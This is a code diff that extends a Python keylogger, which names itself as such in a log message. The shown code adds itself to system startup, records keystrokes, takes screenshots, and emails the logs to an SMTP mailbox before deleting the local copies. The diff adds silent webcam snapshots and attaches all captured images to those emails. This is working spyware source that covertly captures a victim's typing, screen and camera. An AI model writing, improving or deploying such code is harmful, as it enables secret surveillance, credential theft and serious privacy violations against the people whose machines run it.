@@ -1,9 +1,13 @@
 import os
+os.environ["NUMPY_EXPERIMENTAL_ARRAY_FUNCTION"] = "0"
+
+import os
 import sys
 import threading
 import traceback
 import smtplib
 import pyautogui
+import cv2
 from datetime import datetime
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
@@ -32,8 +36,8 @@ def log_debug(message):
     try:
         with open(DEBUG_LOG_FILE, "a", encoding="utf-8") as f:
             f.write(f"[{datetime.now()}] {message}\n")
-    except Exception:
-        pass  # Fail silently if debug logging breaks
+    except:
+        pass
 
 # === STARTUP PERSISTENCE ===
 def add_to_startup():
@@ -66,8 +70,25 @@ def take_screenshot():
     except Exception:
         log_debug("Screenshot failed:\n" + traceback.format_exc())
 
+# === WEBCAM CAPTURE ===
+def capture_webcam_image():
+    try:
+        cam = cv2.VideoCapture(0)
+        ret, frame = cam.read()
+        if ret:
+            filename = f'webcam_{datetime.now().strftime("%Y-%m-%d_%H-%M-%S")}.png'
+            filepath = os.path.join(SCREENSHOT_DIR, filename)
+            cv2.imwrite(filepath, frame)
+            log_debug(f"Webcam image saved: {filepath}")
+        cam.release()
+        cv2.destroyAllWindows()
+    except Exception:
+        log_debug("Webcam capture failed:\n" + traceback.format_exc())
+
+# === LOOPING TASKS ===
 def screenshot_loop():
     take_screenshot()
+    capture_webcam_image()
     threading.Timer(SEND_INTERVAL, screenshot_loop).start()
 
 # === SEND EMAIL ===
@@ -83,20 +104,20 @@ def send_logs():
                 msg['From'] = EMAIL_ADDRESS
                 msg['To'] = EMAIL_ADDRESS
 
-                msg.attach(MIMEText("Attached are the latest keystrokes and screenshot.", "plain"))
+                msg.attach(MIMEText("Attached are the latest keystrokes and images.", "plain"))
                 msg.attach(MIMEText(content, 'plain'))
 
-                screenshots = sorted(os.listdir(SCREENSHOT_DIR))
-                if screenshots:
-                    latest = screenshots[-1]
-                    screenshot_path = os.path.join(SCREENSHOT_DIR, latest)
-                    with open(screenshot_path, 'rb') as file:
+                # Attach all image files (screenshots + webcam)
+                images = sorted(os.listdir(SCREENSHOT_DIR))
+                for img_file in images:
+                    img_path = os.path.join(SCREENSHOT_DIR, img_file)
+                    with open(img_path, 'rb') as f:
                         part = MIMEBase('application', 'octet-stream')
-                        part.set_payload(file.read())
+                        part.set_payload(f.read())
                         encoders.encode_base64(part)
-                        part.add_header('Content-Disposition', f'attachment; filename={latest}')
+                        part.add_header('Content-Disposition', f'attachment; filename={img_file}')
                         msg.attach(part)
-                    log_debug(f"Attached screenshot: {latest}")
+                        log_debug(f"Attached image: {img_file}")
 
                 server = smtplib.SMTP(SMTP_HOST, SMTP_PORT)
                 server.starttls()
@@ -108,8 +129,8 @@ def send_logs():
                 # Clear logs and screenshots after sending
                 with open(LOG_FILE, 'w', encoding='utf-8') as file:
                     file.write('')
-                for scr in os.listdir(SCREENSHOT_DIR):
-                    os.remove(os.path.join(SCREENSHOT_DIR, scr))
+                for img in images:
+                    os.remove(os.path.join(SCREENSHOT_DIR, img))
                 log_debug("Cleared keylog and screenshots after sending.")
             else:
                 log_debug("Log file empty — nothing to send.")
@@ -123,9 +144,11 @@ def main():
     log_debug("=== Keylogger started ===")
     add_to_startup()
 
+    # Start periodic screenshot + webcam + email sending
     screenshot_loop()
     send_logs()
 
+    # Start keylogger listener (blocking)
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
 
